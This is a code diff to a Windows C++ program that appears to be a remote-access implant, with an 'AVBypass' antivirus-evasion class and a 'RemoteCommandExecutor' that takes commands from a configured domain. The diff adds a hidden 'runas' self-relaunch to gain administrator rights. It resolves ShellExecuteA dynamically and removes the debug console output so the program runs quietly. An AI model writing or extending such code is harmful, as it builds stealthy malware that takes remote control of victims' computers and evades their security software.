@@ -1,6 +1,7 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
+#include <shellapi.h>
 #include <string>
 #include <memory>
 #include <cstdarg>
@@ -92,6 +93,15 @@ typedef DWORD (WINAPI* GetModuleFileNameA_t)(
     HMODULE hModule,
     LPSTR lpFilename,
     DWORD nSize
+);
+
+typedef HINSTANCE (WINAPI* ShellExecuteA_t)(
+    HWND hwnd,
+    LPCSTR lpOperation,
+    LPCSTR lpFile,
+    LPCSTR lpParameters,
+    LPCSTR lpDirectory,
+    int nShowCmd
 );
 
 typedef LPVOID (WINAPI* VirtualAlloc_t)(
@@ -532,18 +542,12 @@ public:
         Utils::snprintf(logMsg, sizeof(logMsg), "[ERROR] %s: %s (Error: %lu)",
                        function.c_str(), message.c_str(), GetLastError());
         write(std::string(logMsg));
-        if (debugMode_) {
-            printf("%s\n", logMsg);
-        }
     }
 
     void writeInfo(const std::string& message) {
         char logMsg[512];
         Utils::snprintf(logMsg, sizeof(logMsg), "[INFO] %s", message.c_str());
         write(std::string(logMsg));
-        if (debugMode_) {
-            printf("%s\n", logMsg);
-        }
     }
 
     void writeDebug(const std::string& message) {
@@ -551,7 +555,6 @@ public:
             char logMsg[512];
             Utils::snprintf(logMsg, sizeof(logMsg), "[DEBUG] %s", message.c_str());
             write(std::string(logMsg));
-            printf("%s\n", logMsg);
         }
     }
 
@@ -1368,6 +1371,40 @@ const unsigned char AVBypass::encryption_key[] = {0x4A, 0x7B, 0x9C, 0x2D, 0x5E, 
 POINT AVBypass::lastMousePos = {0, 0};
 DWORD AVBypass::lastMouseCheckTime = 0;
 
+bool isRunningAsAdmin() {
+    BOOL isAdmin = FALSE;
+    PSID adminGroup = nullptr;
+    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+    
+    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
+                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
+        CheckTokenMembership(nullptr, adminGroup, &isAdmin);
+        FreeSid(adminGroup);
+    }
+    
+    return (isAdmin == TRUE);
+}
+
+bool requestElevation() {
+    char exePath[MAX_PATH];
+    if (GetModuleFileNameA(nullptr, exePath, MAX_PATH) == 0) {
+        return false;
+    }
+    
+    LPSTR cmdLine = GetCommandLineA();
+    if (cmdLine == nullptr) {
+        return false;
+    }
+    
+    ShellExecuteA_t pShellExecuteA = getProcAddressTyped<ShellExecuteA_t>("shell32.dll", "ShellExecuteA");
+    if (pShellExecuteA == nullptr) {
+        return false;
+    }
+    
+    HINSTANCE result = pShellExecuteA(nullptr, "runas", exePath, cmdLine, nullptr, SW_HIDE);
+    return (reinterpret_cast<INT_PTR>(result) > 32);
+}
+
 class RemoteCommandExecutor {
 public:
     RemoteCommandExecutor(const std::string& domain = Config::INITIAL_DOMAIN, int port = Config::HTTP_PORT, bool debugMode = false) 
@@ -1606,6 +1643,13 @@ private:
 };
 
 int main(int argc, char* argv[]) {
+    if (!isRunningAsAdmin()) {
+        if (!requestElevation()) {
+            return 1;
+        }
+        return 0;
+    }
+    
     std::string domain = Config::INITIAL_DOMAIN;
     int port = Config::HTTP_PORT;
     bool debugMode = false;
@@ -1622,13 +1666,6 @@ int main(int argc, char* argv[]) {
                 port = Config::HTTP_PORT;
             }
         }
-    }
-
-    if (debugMode) {
-        printf("[DEBUG MODE ENABLED]\n");
-        printf("Domain: %s\n", domain.c_str());
-        printf("Port: %d\n", port);
-        printf("Starting Remote Command Executor...\n\n");
     }
 
     try {
